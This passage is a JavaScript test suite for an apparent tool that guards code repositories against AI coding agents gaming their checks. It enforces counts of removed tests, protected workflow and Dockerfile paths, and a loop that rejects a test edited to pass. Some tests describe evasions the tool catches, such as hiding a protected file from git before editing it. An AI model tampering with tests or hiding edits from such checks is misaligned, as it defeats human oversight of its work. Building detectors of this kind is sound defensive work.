    const out = execFileSync(process.execPath, [CLI, 'contract', '--say-why'], { cwd: c.d, encoding: 'utf8' });
    const cfg = JSON.parse(readFileSync(join(c.d, 'promptwheel.config.json'), 'utf8'));
    assert.equal(cfg.metrics.find((m) => m.name === 'test_count').allowable, true, 'the switch is turned on in a signed repo');
    assert.doesNotMatch(out, /nothing changed/, 'it changed the contract, so it does not say nothing changed');
    assert.match(out, /Sawbuck-Allow: test_count: <what was removed, and who asked for it>/, 'the line to write is shown');
    assert.match(out, /check --allow/, 'the contract is a protected path: the commit that carries this takes a person');
    assert.match(execFileSync(process.execPath, [CLI, 'contract', '--say-why'], { cwd: c.d, encoding: 'utf8' }), /already signed, nothing changed/, 'a second time changes nothing and says so');
  } finally { rmSync(c.d, { recursive: true, force: true }); }
});


// ---- 0.2.2, a repo with one person in it (proof-bench/outside-repos, the look back of 2026-11-19): a sent-back
// pull request is let through by someone who did not open it, and with Claude Code the person IS the opener and the
// agent works under the same account. GitHub cannot tell the two apart there, so what can be kept is a reason.
// --solo: what --say-why does, and the opener's own comment counts on a pull request.
test('contract --solo: a reason in a commit clears a removed test, the opener\'s own comment clears a protected path, and it says GitHub cannot tell the two apart', () => {
  const mk = (...flags) => {
    const { d, g } = tmpRepo();
    writeFileSync(join(d, 'package.json'), '{"name":"x","type":"module","scripts":{"test":"node --test"}}');
    mkdirSync(join(d, 'test')); writeFileSync(join(d, 'test/a.test.js'), "import test from 'node:test';\ntest('add', () => {});\ntest('sub', () => {});\n");
    mkdirSync(join(d, '.github/workflows'), { recursive: true }); writeFileSync(join(d, '.github/workflows/ci.yml'), 'name: ci\non: push\njobs: {}\n');
    g('add', '-A'); g('commit', '-qm', 'tests');
    const out = execFileSync(process.execPath, [CLI, 'contract', ...flags], { cwd: d, encoding: 'utf8' });
    g('add', '-A'); g('commit', '-qm', 'the contract');
    return { d, g, out };
  };
  const pw = (d, ...a) => { const r = spawnSync(process.execPath, [ENGINE_BIN, ...a], { cwd: d, encoding: 'utf8' }); return { code: r.status, out: r.stdout }; };
  const mine = JSON.stringify({ body: 'sawbuck-allow: I changed the CI step myself', author_association: 'OWNER', user: { type: 'User', login: 'solo-dev' } }) + '\n';
  const openerSays = (d, base) => spawnSync(process.execPath, [ENGINE_BIN, 'pr-allow', '--author', 'solo-dev', '--base', base], { cwd: d, input: mine, encoding: 'utf8' }).stdout;
  const workflowChange = ({ d, g }) => {
    const base = g('rev-parse', 'HEAD').trim();
    writeFileSync(join(d, '.github/workflows/ci.yml'), 'name: ci\non: push\njobs: {}\n# a step\n'); g('commit', '-qam', 'a step in the workflow');
    const asked = pw(d, 'run', '--base', base, '--head', 'HEAD', '--json', '--no-record');
    const reason = openerSays(d, base);
    const told = pw(d, 'run', '--base', base, '--head', 'HEAD', '--markdown', '--no-record').out;
    return { asked: asked.code, rep: JSON.parse(asked.out), reason, told, after: reason ? pw(d, 'run', '--base', base, '--head', 'HEAD', '--json', '--no-record', '--allow', reason).code : null };
  };
  const a = mk('--solo');
  try {
    const cfg = JSON.parse(readFileSync(join(a.d, 'promptwheel.config.json'), 'utf8'));
    assert.equal(cfg.allowFromAuthor, true); assert.equal(cfg.allowTrailer, undefined); assert.equal(cfg.metrics.find((m) => m.name === 'test_count').allowable, true);
    assert.match(a.out, /Sawbuck-Allow: test_count: <what was removed, and who asked for it>/);
    assert.match(a.out, /One person works here \(--solo\), so on a pull request your own comment counts: sawbuck-allow: <reason>/);
    assert.match(a.out, /GitHub cannot tell you from your agent there: the agent works under your account\. What is kept is the reason, not proof of who gave it\./);
    // each way through, as printed
    writeFileSync(join(a.d, 'test/a.test.js'), "import test from 'node:test';\ntest('add', () => {});\n");
    a.g('commit', '-qam', 'drop the sub test\n\nSawbuck-Allow: test_count: the rule it checked went, I asked for it');
    assert.equal(pw(a.d, 'run', '--base', 'HEAD~1', '--head', 'HEAD', '--json', '--no-record').code, 0, 'a reason in a commit clears a removed test');
    const w = workflowChange(a);
    assert.equal(w.asked, 1, 'a workflow change is still sent back'); assert.equal(w.rep.openerCounts, true);
    assert.match(w.told, /To accept this, comment `sawbuck-allow: <the reason>` on this PR/, 'the comment the check posts names the way through that works here');
    assert.match(w.reason, /I changed the CI step myself \(approved by solo-dev\)/, 'the opener\'s own comment counts'); assert.equal(w.after, 0, 'and with it the change passes');
    const before = readFileSync(join(a.d, 'promptwheel.config.json'), 'utf8');
    assert.match(execFileSync(process.execPath, [CLI, 'contract'], { cwd: a.d, encoding: 'utf8' }), /already signed, nothing changed/);
    assert.equal(readFileSync(join(a.d, 'promptwheel.config.json'), 'utf8'), before, 'a second signing with no switch keeps both');
  } finally { rmSync(a.d, { recursive: true, force: true }); }
  const b = mk();
  try {
    const w = workflowChange(b);
    assert.equal(w.asked, 1); assert.equal(w.reason, '', 'a plain contract: the opener\'s own comment does not count'); assert.equal(w.rep.openerCounts, undefined);
    assert.match(w.told, /someone with write access who did not open this PR comments/);
    // typed in a repo already signed: it says what changed, and that a pull request cannot turn it on for itself
    const out = execFileSync(process.execPath, [CLI, 'contract', '--solo'], { cwd: b.d, encoding: 'utf8' });
    assert.match(out, /already signed\. Two things changed in promptwheel\.config\.json: the counts of the tests now take a reason written in a commit; on a pull request your own comment now counts/);
    assert.match(out, /check --allow/); assert.match(out, /a pull request cannot turn this on for itself/);
    assert.equal(JSON.parse(readFileSync(join(b.d, 'promptwheel.config.json'), 'utf8')).allowFromAuthor, true);
    assert.match(execFileSync(process.execPath, [CLI, 'contract', '--solo'], { cwd: b.d, encoding: 'utf8' }), /already signed, nothing changed/);
  } finally { rmSync(b.d, { recursive: true, force: true }); }
  const c = mk('--say-why');
  try { assert.match(execFileSync(process.execPath, [CLI, 'contract', '--solo'], { cwd: c.d, encoding: 'utf8' }), /already signed\. One thing changed in promptwheel\.config\.json: on a pull request your own comment now counts/); } finally { rmSync(c.d, { recursive: true, force: true }); }
});

// ---- 0.2.2, trying the pull request check before it counts. The check asks on about 1 in 6 reviewed agent pull
// requests, and until now the only way to see what it says on yours was to let it fail them.
test('contract --full --comment-only: the workflow it writes never fails a pull request, and a workflow that is already there is not rewritten', () => {
  const mk = (...flags) => {
    const { d, g } = tmpRepo();
    writeFileSync(join(d, 'package.json'), '{"name":"x","type":"module","scripts":{"test":"node --test"}}');
    mkdirSync(join(d, 'test')); writeFileSync(join(d, 'test/a.test.js'), "import test from 'node:test';\ntest('add', () => {});\n");
    g('remote', 'add', 'origin', 'https://github.com/example/x.git'); g('add', '-A'); g('commit', '-qm', 'tests');
    const r = spawnSync(process.execPath, [CLI, 'contract', ...flags], { cwd: d, encoding: 'utf8' });
    return { d, g, out: r.stdout + r.stderr, code: r.status };
  };
  const wfOf = (d) => { try { return readFileSync(join(d, '.github/workflows/sawbuck.yml'), 'utf8'); } catch { return ''; } };
  const a = mk('--full', '--comment-only');
  try {
    assert.equal(a.code, 0, a.out);
    assert.match(wfOf(a.d), /^        with: \{ inconclusive: pass, comment-only: true \}$/m);
    assert.match(a.out, /It is comment only \(--comment-only\): no pull request fails, and the comment says what would have been sent back\./);
    assert.match(a.out, /To make it count, take "comment-only: true" out of the workflow's last line\./);
  } finally { rmSync(a.d, { recursive: true, force: true }); }
  const b = mk('--full');
  try {
    assert.doesNotMatch(wfOf(b.d), /comment-only/, 'without the switch the check counts');
    const was = wfOf(b.d);
    const out = execFileSync(process.execPath, [CLI, 'contract', '--full', '--comment-only'], { cwd: b.d, encoding: 'utf8' });
    assert.equal(wfOf(b.d), was, 'a workflow that is already there is never rewritten');
    assert.match(out, /\.github\/workflows\/sawbuck\.yml is already here, and Sawbuck never rewrites a workflow file\. To make it comment only, change its last line yourself to:\n    with: \{ inconclusive: pass, comment-only: true \}/);
  } finally { rmSync(b.d, { recursive: true, force: true }); }
  const c = mk('--comment-only');
  try {
    assert.equal(wfOf(c.d), '', 'plain signing writes no workflow');
    assert.match(c.out, /--comment-only is about the pull request check, and --full is what writes it: .*contract --full --comment-only/);
  } finally { rmSync(c.d, { recursive: true, force: true }); }
  const { d } = tmpRepo();
  try { const r = spawnSync(process.execPath, [CLI, 'contract', '--coment-only'], { cwd: d, encoding: 'utf8' }); assert.equal(r.status, 64); assert.match(r.stderr, /unknown flag --coment-only/); } finally { rmSync(d, { recursive: true, force: true }); }
});

// Found 2026-11-20 (proof-bench/gatekeep-study, then proof-bench/live/release-0.2.3). The engine printed its report and
// called process.exit() at once, and so did `sawbuck check --json`. Node writes to a pipe in the background and an exit
// drops what the pipe has not taken, so a report larger than a pipe holds arrived cut. The report lists every test,
// fixture and config file a change touches: beside a few thousand of them `sawbuck check` said "could not run the check
// here: the engine gave no verdict" (exit 64), and something reading `check --json` got 65,536 bytes of it.
const bigChange = (n) => {
  const { d, g } = tmpRepo();
  writeFileSync(join(d, 'package.json'), '{"name":"x","version":"1.0.0","scripts":{"test":"node --test test/a.test.js"}}\n');
  mkdirSync(join(d, 'test')); writeFileSync(join(d, 'test/a.test.js'), "require('node:test').test('a', () => {})\n");
  g('add', '-A'); g('commit', '-qm', 'a test');
  const deep = join(d, 'fixtures', 'a-folder-name-long-enough-that-fifteen-hundred-files-in-it-make-a-report-no-pipe-holds');
  mkdirSync(deep, { recursive: true });
  for (let i = 0; i < n; i++) writeFileSync(join(deep, `case-${String(i).padStart(4, '0')}.json`), `{"case":${i}}\n`);
  g('add', '-A'); g('commit', '-qm', `${n} fixture files`);
  return d;
};
test('check gives its verdict on a change that adds fifteen hundred fixture files, and check --json arrives whole through a reader that starts late', () => {
  const d = bigChange(1500);
  try {
    const r = spawnSync(process.execPath, [CLI, 'check'], { cwd: d, encoding: 'utf8' });
    assert.equal(r.status, 0, `sawbuck check said: ${(r.stdout + r.stderr).split('\n')[0]}`);
    assert.match(r.stdout, /held: nothing got worse in your last change/);
    // a real pipe between two processes whose reader takes nothing for a second (a busy parent, a slow tool)
    const o = join(d, '..', 'late-check.out'), c = join(d, '..', 'late-check.code');
    spawnSync('sh', ['-c', '( "$0" "$@" 2>/dev/null; echo $? > "$CODE" ) | ( sleep 1; cat ) > "$OUT"', process.execPath, CLI, 'check', '--json'], { cwd: d, env: { ...process.env, OUT: o, CODE: c } });
    const text = readFileSync(o, 'utf8'); let rep = null; try { rep = JSON.parse(text); } catch { /* cut */ }
    assert.ok(rep, `check --json did not arrive whole: ${Buffer.byteLength(text)} bytes came`);
    assert.ok(Buffer.byteLength(text) > 146176, `this test means nothing unless the report is larger than what used to arrive: ${Buffer.byteLength(text)} bytes`);
    assert.equal(rep.verdict, 'pass'); assert.equal(+readFileSync(c, 'utf8'), 0); assert.equal(rep.gate.goalposts.length, 1500);
  } finally { rmSync(d, { recursive: true, force: true }); }
});

// The same fault beside it (proof-bench/live/release-0.2.3, debt-neighbour.sh): `sawbuck debt --json` printed and called
// process.exit() at once, and `sawbuck status` reads it through a pipe. Its JSON holds a few hundred bytes for each
// file that carries debt, so in a repo with about 550 such files status said "could not read the ledger".
test('status reads the debt of a repo where a thousand files each silence a lint rule, and debt --json arrives whole through a reader that starts late', () => {
  const { d, g } = tmpRepo();
  try {
    const dir = join(d, 'src', 'a-folder-name-of-ordinary-length', 'components'); mkdirSync(dir, { recursive: true });
    for (let i = 0; i < 1000; i++) writeFileSync(join(dir, `widget-${String(i).padStart(4, '0')}.js`), `// eslint-disable-next-line no-unused-vars\nconst unused${i} = ${i};\nmodule.exports = {};\n`);
    g('add', '-A'); g('commit', '-qm', 'a thousand widgets');
    const st = spawnSync(process.execPath, [CLI, 'status'], { cwd: d, encoding: 'utf8' }).stdout;
    assert.doesNotMatch(st, /could not read the ledger/, 'status read the debt');
    assert.match(st, /Debt accruing now\n     1000 silenced in HEAD/, 'and says what it holds');
    const o = join(d, '..', 'late-debt.out'), c = join(d, '..', 'late-debt.code');
    spawnSync('sh', ['-c', '( "$0" "$@" 2>/dev/null; echo $? > "$CODE" ) | ( sleep 1; cat ) > "$OUT"', process.execPath, CLI, 'debt', '--json', '--fail-on', 'any'], { cwd: d, env: { ...process.env, OUT: o, CODE: c } });
    const text = readFileSync(o, 'utf8'); let j = null; try { j = JSON.parse(text); } catch { /* cut */ }
    assert.ok(j, `debt --json did not arrive whole: ${Buffer.byteLength(text)} bytes came`);
    assert.equal(j.total, 1000); assert.equal(j.files.length, 1000); assert.ok(Buffer.byteLength(text) > 146176);
    assert.equal(+readFileSync(c, 'utf8'), 1, 'and the exit code is still the gate\'s: --fail-on any with debt in the tree');
  } finally { rmSync(d, { recursive: true, force: true }); }
});

// ---- 0.2.3, the two lines in a repo where no test command is found. Typed in copies of twelve real repos
// (proof-bench/fact-sheets, 2026-11-20), `contract --full --comment-only` wrote the workflow in 6 and none in 6: every
// .NET repo and three others. The reason it printed, "a placeholder would fail every pull request", was not true: the
// workflow passes `inconclusive: pass`, and with it a plain change passes with no comment while a removed test and a
// changed workflow still speak (proof-bench/live/release-0.2.3, t1.py). The counts and the protected paths need no
// test command, and comment-only fails nothing, so that mode writes the workflow there too.
test('contract --full --comment-only writes the workflow where no test command is found and says no tests are run; without the switch it writes none and says how to try it', () => {
  const mk = (...flags) => {
    const { d, g } = tmpRepo();   // no package.json, go.mod, Cargo.toml or pyproject.toml: nothing a test command is found from
    mkdirSync(join(d, 'tests')); writeFileSync(join(d, 'tests/AddTests.cs'), 'using Xunit;\npublic class AddTests {\n  [Fact] public void Adds() { Assert.Equal(4, 2 + 2); }\n}\n');
    g('remote', 'add', 'origin', 'https://github.com/example/x.git'); g('add', '-A'); g('commit', '-qm', 'tests');
    const r = spawnSync(process.execPath, [CLI, 'contract', ...flags], { cwd: d, encoding: 'utf8' });
    return { d, g, out: r.stdout + r.stderr, code: r.status };
  };
  const wfOf = (d) => { try { return readFileSync(join(d, '.github/workflows/sawbuck.yml'), 'utf8'); } catch { return ''; } };
  const testCmd = (d) => JSON.parse(readFileSync(join(d, 'promptwheel.config.json'), 'utf8')).metrics.find((m) => m.name === 'tests_pass').cmd;
  const a = mk('--full', '--comment-only');
  try {
    assert.equal(a.code, 0, a.out); assert.match(testCmd(a.d), /set your test command/, 'the scene: no test command was found');
    assert.match(wfOf(a.d), /^        with: \{ inconclusive: pass, comment-only: true \}$/m, `the workflow is written; the command said: ${a.out}`);
    assert.match(a.out, /Added \.github\/workflows\/sawbuck\.yml, so pull requests are checked in CI\. Commit it with the rest\./);
    assert.match(a.out, /It is comment only \(--comment-only\): no pull request fails, and the comment says what would have been sent back\./);
    assert.match(a.out, /No test command was found here, so the check runs no tests yet\. It still reads the counts of your tests and the protected paths\.\n  To have your tests run, put your test command in promptwheel\.config\.json where the placeholder is\.\n/);
    assert.doesNotMatch(a.out, /No CI check added/);
    // a second run changes nothing and does not write over the workflow
    const was = wfOf(a.d); const again = spawnSync(process.execPath, [CLI, 'contract', '--full', '--comment-only'], { cwd: a.d, encoding: 'utf8' });
    assert.equal(wfOf(a.d), was); assert.match(again.stdout, /already signed, nothing changed/);
  } finally { rmSync(a.d, { recursive: true, force: true }); }
  const b = mk('--full');
  try {
    assert.equal(b.code, 0, b.out); assert.equal(wfOf(b.d), '', 'without the switch no workflow is written where no test command is found');
    assert.match(b.out, /No CI check added: no test command was found here\. Put yours in promptwheel\.config\.json where the placeholder is, then run .*contract --full again\.\n  To try the check on pull requests before that, run .*contract --full --comment-only: it runs no tests, reads the counts of your tests and the protected paths, and fails no pull request\.\n/);
    assert.doesNotMatch(b.out, /a placeholder would fail every pull request/, 'that sentence was not true');
    // and that line does what it says, in the same repo
    const then = spawnSync(process.execPath, [CLI, 'contract', '--full', '--comment-only'], { cwd: b.d, encoding: 'utf8' });
    assert.match(wfOf(b.d), /comment-only: true/, then.stdout + then.stderr);
  } finally { rmSync(b.d, { recursive: true, force: true }); }
  const c = mk('--full', '--comment-only', '--dry-run');
  try {
    assert.equal(wfOf(c.d), '', 'a dry run writes nothing');
    assert.match(c.out, /\.github\/workflows\/sawbuck\.yml\s+.*a CI check on pull requests, comment only: it fails none/, c.out);
  } finally { rmSync(c.d, { recursive: true, force: true }); }
  // no github.com origin: said as before, in both modes
  const { d, g } = tmpRepo();
  try { const r = spawnSync(process.execPath, [CLI, 'contract', '--full', '--comment-only'], { cwd: d, encoding: 'utf8' }); assert.equal(wfOf(d), ''); assert.match(r.stdout, /No CI check added: this repo has no github\.com origin\. Run sawbuck contract --full again once it has one\./); } finally { rmSync(d, { recursive: true, force: true }); }
});

// second read of 0.2.7: check passes its flags to the engine, and the engine now knows --pull-request (the Action's). On a
// person's machine it printed the comment's markdown words at the terminal; it is refused as it was in 0.2.6.
test('check refuses --pull-request: it is the Action\'s flag, not a check on this machine', () => {
  const { d } = tmpRepo();
  try {
    const r = spawnSync(process.execPath, [CLI, 'check', '--pull-request'], { cwd: d, encoding: 'utf8' });
    assert.equal(r.status, 64, r.stdout + r.stderr); assert.match(r.stdout + r.stderr, /unknown flag --pull-request for check/);
  } finally { rmSync(d, { recursive: true, force: true }); }
});

// ---- 0.2.7: two or more named tests gone from the changed files (engine 0.8.20, the reading R1(c) of
// proof-bench/per-test). `sawbuck check` prints the engine's note in the comment's own sentence. Never part of the verdict.
test('check notes two or more named tests the changed files no longer name, and says a rename reads the same way', () => {
  const { d, g } = tmpRepo();
  try {
    writeFileSync(join(d, 'package.json'), '{"name":"x","version":"1.0.0","scripts":{"test":"node --test test/a.test.js"}}\n');
    mkdirSync(join(d, 'test')); writeFileSync(join(d, 'test/a.test.js'), "const { test } = require('node:test');\ntest('one', () => {});\ntest('two', () => {});\ntest('three', () => {});\n");
    g('add', '-A'); g('commit', '-qm', 'three tests'); const base = g('rev-parse', 'HEAD').trim();
    writeFileSync(join(d, 'test/a.test.js'), "const { test } = require('node:test');\ntest('one', () => {});\n"); g('add', '-A'); g('commit', '-qm', 'two out');
    const r = spawnSync(process.execPath, [CLI, 'check', '--base', base], { cwd: d, encoding: 'utf8' });
    assert.match(r.stdout, /sawbuck: note: 2 tests that were named in the changed files are not named in them now: three, two\. A rename reads the same way\.\n/, r.stdout + r.stderr);
    const j = JSON.parse(spawnSync(process.execPath, [CLI, 'check', '--base', base, '--json'], { cwd: d, encoding: 'utf8' }).stdout);
    assert.deepEqual(j.testsGone, { gone: 2, names: ['three', 'two'], more: 0, emptied: [] });
  } finally { rmSync(d, { recursive: true, force: true }); }
});

// ---- the next version: tests a change added and took out again (engine 0.8.17, proof-bench/per-test). The check holds
// the head against the base, so tests an agent wrote in one commit and deleted in a later one left no trace. Over a
// range of commits `sawbuck check --base` now says so in a note, with their names. It is never part of the verdict.
test('check --base over several commits notes the tests an earlier commit added that are all gone, and the check of one commit does not', () => {
  const { d, g } = tmpRepo();
  try {
    writeFileSync(join(d, 'package.json'), '{"name":"x","version":"1.0.0","scripts":{"test":"node --test test/a.test.js"}}\n');
    mkdirSync(join(d, 'test')); writeFileSync(join(d, 'test/a.test.js'), "require('node:test').test('a', () => {})\n");
    g('add', '-A'); g('commit', '-qm', 'a test'); const base = g('rev-parse', 'HEAD').trim();
    writeFileSync(join(d, 'test/more.test.js'), "const { test } = require('node:test');\ntest('adds two', () => {});\ntest('adds three', () => {});\n");
    g('add', '-A'); g('commit', '-qm', 'two more tests'); const c1 = g('rev-parse', '--short', 'HEAD').trim();
    rmSync(join(d, 'test/more.test.js')); writeFileSync(join(d, 'a.js'), 'export const v = 2;\n'); g('add', '-A'); g('commit', '-qm', 'drop them');
    const r = spawnSync(process.execPath, [CLI, 'check', '--base', base], { cwd: d, encoding: 'utf8' });
    assert.equal(r.status, 0, r.stdout + r.stderr);
    assert.match(r.stdout, new RegExp(`sawbuck: note: an earlier commit of this change \\(${c1}\\) added 2 tests, and none of them is in it now: adds three, adds two\n`), r.stdout);
    const j = JSON.parse(spawnSync(process.execPath, [CLI, 'check', '--base', base, '--json'], { cwd: d, encoding: 'utf8' }).stdout);
    assert.deepEqual(j.testsTakenOut, { added: 2, names: ['adds three', 'adds two'], more: 0, at: c1 }); assert.equal(j.verdict, 'pass');
    const last = spawnSync(process.execPath, [CLI, 'check'], { cwd: d, encoding: 'utf8' });
    assert.doesNotMatch(last.stdout, /an earlier commit of this change/, 'one commit has no earlier commit');
  } finally { rmSync(d, { recursive: true, force: true }); }
});

// ---- The wheel in Sawbuck (proof-bench/wheel/PLAN.md, 2026-11-21) -------------------------------------------------------
// The engine's loop and its record were never reachable from Sawbuck: no command ran `improve` and nothing read the
// record. The hooks' checks did write the engine's rows until the engine dropped the record in 0.8.0; a person's
// `sawbuck check` never did.
const calcRepo = () => {
  const { d, g } = tmpRepo();
  writeFileSync(join(d, 'package.json'), '{"name":"w","version":"1.0.0","scripts":{"test":"node --test"}}\n');
  mkdirSync(join(d, 'src')); mkdirSync(join(d, 'test'));
  writeFileSync(join(d, 'src/calc.js'), 'exports.add=(a,b)=>a-b\n');
  writeFileSync(join(d, 'test/calc.test.js'), "const t=require('node:test'),a=require('node:assert');const {add}=require('../src/calc.js')\nt.test('add',()=>a.equal(add(2,2),4))\n");
  g('add', '-A'); g('commit', '-qm', 'a failing test');
  return { d, g };
};
// An attempt every runner can run. `sed -i 's/a/b/' file` is GNU's: the sed on a Mac takes the word after -i as a backup
// suffix and reads the file name as its script, so two tests here failed on the Mac runner on the commit the 0.2.5 wave
// had just pushed ("undefined label 'est/calc.test.js'"). Node is the one tool this suite is sure of on every runner.
const swap = (file, from, to) => `node -e "const fs=require('fs');fs.writeFileSync('${file}',fs.readFileSync('${file}','utf8').replace('${from}','${to}'))"`;
const sb2 = (args, cwd) => { const r = spawnSync(process.execPath, [CLI, ...args], { cwd, encoding: 'utf8', env: { ...process.env, HOME: TMP_HOME } }); return { code: r.status, out: r.stdout, err: r.stderr }; };
const wheelRows = (d) => { try { return readFileSync(join(d, '.git', 'promptwheel', 'outcomes.jsonl'), 'utf8').split('\n').filter(Boolean).map((l) => JSON.parse(l)); } catch { return []; } };
// the loop's own record: one line a try, written by the loop step the engine's improve runs (one keeper, 2026-11-21)
const loopLines = (d) => { try { return readFileSync(join(d, '.git', 'improve', 'attempts.jsonl'), 'utf8').split('\n').filter(Boolean).map((l) => JSON.parse(l)); } catch { return []; } };

test('sawbuck improve keeps a change only if it measured better, and playbook, insights and suggest read what the loop did', () => {
  const { d, g } = calcRepo();
  try {
    const base = g('rev-parse', 'HEAD').trim();
    // a test edited to pass: put back, exit 2
    let r = sb2(['improve', '--target', 'tests_pass', '--attempt', swap('test/calc.test.js', 'add(2,2),4', 'add(2,2),0')], d);
    assert.equal(r.code, 2, r.out + r.err); assert.equal(g('rev-parse', 'HEAD').trim(), base); assert.equal(porcelain(d), '');
    // the source fixed: kept as one commit, exit 0
    r = sb2(['improve', '--goal', 'tests_pass', '--label', 'fix add', '--attempt', swap('src/calc.js', 'a-b', 'a+b')], d);
    assert.equal(r.code, 0, r.out + r.err); assert.equal(g('rev-list', '--count', `${base}..HEAD`).trim(), '1');
    assert.deepEqual(loopLines(d).map((x) => x.result), ['gamed', 'kept']);
    assert.ok(wheelRows(d).length >= 2, 'each check the loop asked for is a row in the engine\'s own record');
    r = sb2(['playbook'], d); assert.equal(r.code, 0, r.err); assert.match(r.out, /## Tried and thrown away/); assert.match(r.out, /moved by changing what it is measured with/);
    for (const c of ['insights', 'suggest']) assert.equal(sb2([c], d).code, 0, c);
    assert.equal(JSON.parse(sb2(['insights', '--json'], d).out).kept, 1);
    r = sb2(['improve'], d); assert.equal(r.code, 64, 'no attempt is a usage error, as in the engine'); assert.match(r.err, /--attempt/);
    assert.match(sb2(['help', '--all'], d).out, /sawbuck improve --attempt/);
    assert.match(sb2(['improve', '--help'], d).out, /keep it only if the target improved/);
  } finally { rmSync(d, { recursive: true, force: true }); }
});
test('sawbuck improve with no target names the test run: the one measure with no contract, and the one that is not a tripwire in the contract Sawbuck writes', () => {
  for (const signed of [false, true]) {
    const { d, g } = calcRepo();
    try {
      if (signed) { assert.equal(sb2(['contract'], d).code, 0); g('add', '-A'); g('commit', '-qm', 'contract'); }
      const r = sb2(['improve', '--attempt', swap('src/calc.js', 'a-b', 'a+b')], d);
      assert.equal(r.code, 0, `${signed ? 'signed' : 'no contract'}: ${r.out}${r.err}`); assert.match(r.out, / kept .*tests_pass 0 to 1/);
      assert.equal(loopLines(d).pop().target, 'tests_pass');
    } finally { rmSync(d, { recursive: true, force: true }); }
  }
});
test('sawbuck improve: an attempt that could not run is not a try: exit 64, nothing on the loop\'s record, the tree as it was', () => {
  const { d, g } = calcRepo();
  try {
    const base = g('rev-parse', 'HEAD').trim();
    const r = sb2(['improve', '--attempt', `${swap('src/calc.js', 'a-b', 'a+b')}; exit 64`], d);
    assert.equal(r.code, 64, r.out + r.err); assert.match(r.err, /could not run/);
    assert.deepEqual(loopLines(d), []); assert.equal(g('rev-parse', 'HEAD').trim(), base); assert.equal(porcelain(d), '');
  } finally { rmSync(d, { recursive: true, force: true }); }
});
test('no test here hands the loop an attempt only GNU sed runs', () => {
  // the Mac runner cannot be run before a wave, so the fault it found is kept out by reading the tests themselves
  const gnuOnly = new RegExp("--attempt'" + ",\\s*[\"'`]" + "sed " + "-i\\b");
  for (const f of readdirSync(dirname(fileURLToPath(import.meta.url))).filter((n) => n.endsWith('.mjs'))) {
    assert.doesNotMatch(readFileSync(join(dirname(fileURLToPath(import.meta.url)), f), 'utf8'), gnuOnly, `${f}: use swap() or another command every runner has`);
  }
});
test('the record is fed by what the hooks check, a look by a person adds no row, and nothing lands in the working tree', () => {
  const { d, g } = calcRepo();
  try {
    writeFileSync(join(d, 'src/calc.js'), 'exports.add=(a,b)=>a+b\n'); g('commit', '-qam', 'fix add');
    sawbuck(['check'], d);                                                                   // a person looks
    assert.equal(wheelRows(d).length, 0, 'a look is not an event');
    reflect(['--repo', d, '--base', 'HEAD~1', '--head', 'HEAD'], d, { LOGBOOK_NO_CACHE: '1' });   // what a hook runs on a commit
    const rows = wheelRows(d); assert.equal(rows.length, 1); assert.equal(rows[0].verdict, 'pass'); assert.deepEqual(rows[0].subsystems, ['src']);
    assert.equal(existsSync(join(d, '.promptwheel')), false, 'no .promptwheel folder in the tree');
  } finally { rmSync(d, { recursive: true, force: true }); }
});
test('detach --purge removes the engine\'s record of checked runs too, and a plain detach names it as still on disk', () => {
  const { d, g } = calcRepo();
  try {
    sawbuck(['attach', '--claude'], d);
    writeFileSync(join(d, 'src/calc.js'), 'exports.add=(a,b)=>a+b\n'); g('commit', '-qam', 'fix add');
    reflect(['--repo', d, '--base', 'HEAD~1', '--head', 'HEAD'], d, { LOGBOOK_NO_CACHE: '1' });
    const f = join(d, '.git', 'promptwheel', 'outcomes.jsonl'); assert.ok(existsSync(f), 'a hook check wrote a row');
    // and a try of the loop: its own record, and the change it tried, kept as a ref
    sb2(['improve', '--target', 'tests_pass', '--attempt', "echo '// note' >> src/calc.js"], d);
    const loop = join(d, '.git', 'improve', 'attempts.jsonl'); assert.ok(existsSync(loop), 'the loop wrote its line'); assert.ok(g('for-each-ref', 'refs/improve').trim(), 'and kept the try as a ref');
    let r = sb2(['detach'], d); assert.equal(r.code, 0, r.err); assert.match(r.out + r.err, /still on disk: .*\.git\/promptwheel\/outcomes\.jsonl/); assert.match(r.out + r.err, /\.git\/improve\/attempts\.jsonl/);
    assert.ok(existsSync(f), 'a plain detach keeps the record');
    r = sb2(['detach', '--purge', '--dry-run'], d); assert.equal(r.code, 0, r.err); assert.match(r.out + r.err, /refs\/improve/); assert.ok(existsSync(loop), 'a dry run removes nothing');
    r = sb2(['detach', '--purge'], d); assert.equal(r.code, 0, r.err); assert.equal(existsSync(f), false, 'the purge removes it');
    assert.equal(existsSync(join(d, '.git', 'improve')), false, 'and the loop\'s record'); assert.equal(g('for-each-ref', 'refs/improve').trim(), '', 'and the tries it kept as refs');
  } finally { rmSync(d, { recursive: true, force: true }); }
});
test('sawbuck improve --turns keeps a fix that takes two turns, and says so in the help', () => {
  const { d, g } = tmpRepo();
  try {
    writeFileSync(join(d, 'promptwheel.config.json'), JSON.stringify({ linkNodeModules: false, metrics: [{ name: 'both', cmd: 'test -f a.js -a -f b.js && grep -q two b.js', extract: 'exit', direction: 'pass', guard: true }] }));
    g('add', '-A'); g('commit', '-qm', 'a contract with one pass-or-fail measure'); const base = g('rev-parse', 'HEAD').trim();
    const step = 'if [ ! -f b.js ]; then echo one > b.js; else echo two > b.js; fi';
    let r = sb2(['improve', '--target', 'both', '--attempt', step], d); assert.equal(r.code, 3, 'judged alone, the first half is put back: ' + r.err); assert.equal(existsSync(join(d, 'b.js')), false);
    r = sb2(['improve', '--target', 'both', '--turns', '3', '--attempt', step], d);
    assert.equal(r.code, 0, r.out + r.err); assert.match(r.out, / kept .*both 0 to 1 \(turn 2 of 2\)/); assert.equal(g('rev-list', '--count', `${base}..HEAD`).trim(), '1');
    assert.match(sb2(['playbook'], d).out, /kept at turn 2 of 2: `both` 0 → 0 → 1/);
    assert.match(sb2(['improve', '--help'], d).out, /--turns N/);
  } finally { rmSync(d, { recursive: true, force: true }); }
});

// Held to another session's attack list (2026-11-21): "what is judged cannot touch what judges it". A protected path
// that a turn hid from git (skip-worktree, assume-unchanged) and then edited was not seen at the end of the turn:
// git diff and git status say nothing about a hidden file.
test('a protected path that is hidden from git and then edited is still seen as changed', () => {
  const { d, g } = tmpRepo();
  try {
    writeFileSync(join(d, 'promptwheel.config.json'), JSON.stringify({ metrics: [{ name: 'ok', cmd: 'true', extract: 'exit', direction: 'pass', guard: true }], mandates: [{ name: 'images-frozen', paths: ['Dockerfile*'], reason: 'not an agent decision' }] }));
    writeFileSync(join(d, 'Dockerfile'), 'FROM node:22\n'); g('add', '-A'); g('commit', '-qm', 'a contract that protects the image');
    assert.deepEqual(Object.keys(protectedDirty(d)), [], 'nothing is changed yet');
